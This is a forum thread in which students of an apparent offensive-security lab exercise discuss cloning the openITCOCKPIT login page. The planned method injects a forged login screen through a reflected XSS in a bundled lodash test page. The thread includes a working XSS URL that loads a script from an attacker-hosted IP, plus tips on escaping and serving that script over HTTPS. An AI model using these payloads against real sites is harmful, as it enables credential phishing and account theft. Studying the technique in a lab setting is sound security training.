
I’m trying to resolve exercise 10.6.2.1-1 (openITcockpit). <<Obtain the HTML from the openITCOCKPIT login page and rewrite the DOM to mimic the login exactly.>>
I have tried this:
Having https://openitcockpit/login/login on the browser, open a console and write…
loginhtml=document.getElementsByTagName("html")[0]
loginhtml.outerHTML
Put the result in an HTML beautifier to try to detect errors. This is saved as a file: login.html and  substitute \” for “. This file is opened in Firefox without problems.
Then in the URL https://openitcockpit/js/vendor/lodash/perf/index.html, I open a console and write…
myhtml=document.getElementsByTagName("html")[0]
myhtml.outerHTML=”CONTENT OF login.html”

Then I receive this error: Uncaught SyntaxError: unexpected token: identifier
debugger eval code:1:30

How can I know in which line is the problem? Any hint to resolve it? 


 For future reference... There can't be any 0x0A. It's needed to put a backslash ( \ ) before 0x0A or completely delete 0x0A's.


Annoying basic Q on OpenITCockpit - Obtain the HTML from the openITCOCKPIT login page and rewrite the DOM to mimic the login exactly - trying to rewrite by setting the .innerhtml attr but keep getting syntax errors. Anyone have any tips for properly escaping the html from the login page?
The_Card_Dealer — 05/16/2022 4:13 PM
You can write quote enclosed JS in multiple lines using back ticks (`). 


You can use "curl" to retrieve the HTML from here https://openitcockpit/login/login/login.html

----


alemusix — 02/20/2024 12:54 PM
Doing ex 10.6.2.1 "Obtain the HTML from the openITCOCKPIT login page and rewrite the DOM to mimic the login exactly". My idea was to use the DOM-based reflected XSS from loadash to rewrite  DOM element by fetching a js I'm hosting from kali. Starting with a simple test case I'm hosting this js: 

html_element = document.getElementsByTagName('html')[0]
html_element.innerHTML = '<h1>Hacked!</h1>' 
I was expecting to see "Hacked!" in the XSS page but I get a lot of errors e.g. "Blocked loading mixed active content" 
https://openitcockpit/js/vendor/lodash/perf/index.html?build=xss"></script><script src= 'http://192.168.45.159/poc.js'></script>
I assumed we are asked to use the XSS to change DOM so that the victim that opens this URL

https://openitcockpit/js/vendor/lodash/perf/index.html?build=xss"></script><script src= 'http://192.168.45.159/poc.js'>

 will actually see the login page because the poc.js changed the DOM. But I'm having issues serving external js. Did I misinterpreted the exercise? 
alemusix — 02/20/2024 5:32 PM
So finally I solved. The issue was hosting the poc on a http server. Since the web app is hosted in https firefox won't allow mix communication between https and http. So I stood up a flask server with self signed certs 

----

